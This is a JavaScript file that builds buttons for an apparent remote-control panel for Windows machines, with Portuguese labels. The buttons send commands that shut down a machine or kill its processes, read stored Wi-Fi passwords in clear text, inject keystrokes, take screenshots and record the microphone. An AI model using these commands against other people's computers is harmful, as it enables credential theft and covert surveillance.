class Button {
    constructor(Text, Style, Action) {
        this.text = Text;
        this.action = Action;
        this.style = Style
    }
    string(){
        // Button Structure
        return `<div class=\"col col-lg-2 col-6 div-button\">
            <button class=\"btn ${this.style}\" onclick=\"${this.action}\" type=\"button\">${this.text}</button>
        </div>`
    }
}

// Buttons Declarations
let buttons = [];
buttons.push(new Button("Bloquear",                  "btn-success",  "putIn('!CM rundll32.exe user32.dll,LockWorkStation');"));
buttons.push(new Button("Hibernar",                  "btn-info",     "putIn('!CM rundll32.exe PowrProf.dll,SetSuspendState');"));
buttons.push(new Button("Encerrar",                  "btn-danger",   "putIn('!CM shutdown -f -s');"));
buttons.push(new Button("Reiniciar",                 "btn-danger",   "putIn('!CM shutdown -f -r');"));
buttons.push(new Button("IP Config",                 "btn-secondary","putIn('!CM ipconfig');"));
buttons.push(new Button("WIFI Acessadas",            "btn-secondary","putIn('!CM netsh wlan show profiles');"));
buttons.push(new Button("Password do WIFI",          "btn-dark",     "getPrompt('Nome de Rede:','!CM netsh wlan show profile name=?? key=clear', true);"));
buttons.push(new Button("Lista de Programas Abertos","btn-secondary","putIn('!CM tasklist');"));
buttons.push(new Button("Encerrar Programa",         "btn-dark",     "getPrompt('PID do Programa:','!CM taskkill /PID ?? /f', false);"));
buttons.push(new Button("Mostrar Mensagem",          "btn-dark",     "getPrompt('Mensagem:','!MB ??', false);"));
buttons.push(new Button("Digitar Mensagem",          "btn-dark",     "getPrompt('Mensagem:','!TT ??', false);"));
buttons.push(new Button("Combinação de Teclas",      "btn-dark",     "getPrompt('Combinação (Separador: +):','!TC ??', false);"));
buttons.push(new Button("ScreenShot",                "btn-dark",     "putIn('!PS');"));
buttons.push(new Button("Gravar Microfone",          "btn-dark",     "getPrompt('Segundos: ','!RA ??', false);"));

// Display buttons on Page
buttons.forEach(button => $("#button-stop").append(button.string()));